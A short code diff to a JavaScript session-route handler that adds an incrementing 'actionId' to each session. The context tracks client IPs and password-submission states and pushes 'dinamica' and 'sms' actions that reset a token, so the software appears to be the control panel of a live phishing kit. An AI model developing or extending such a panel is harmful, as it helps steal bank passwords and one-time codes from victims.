@@ -54,6 +54,7 @@ const registerSessionRoutes = (prefix) => {
         ip: clientIp,
         state: state || (isSubmittingPassword ? "waiting" : sessions[id].state),
         action: action !== undefined ? action : (isSubmittingPassword ? null : sessions[id].action),
+        actionId: sessions[id].actionId || 0,
         customImage: customImage !== undefined ? customImage : sessions[id].customImage,
         last_seen: Date.now(),
         updatedAt: Date.now()
@@ -71,6 +72,7 @@ const registerSessionRoutes = (prefix) => {
         customImage: customImage !== undefined ? customImage : (globalCustomImage || null),
         token: "",
         action: null,
+        actionId: 0,
         createdAt: Date.now(),
         last_seen: Date.now(),
         updatedAt: Date.now()
@@ -136,6 +138,7 @@ const registerSessionRoutes = (prefix) => {
     if (!sessions[id]) return res.status(404).json({ error: "Session not found" });
 
     sessions[id].action = action;
+    sessions[id].actionId = (sessions[id].actionId || 0) + 1;
     if (state) sessions[id].state = state;
     if (action === "dinamica" || action === "sms") {
       sessions[id].token = "";
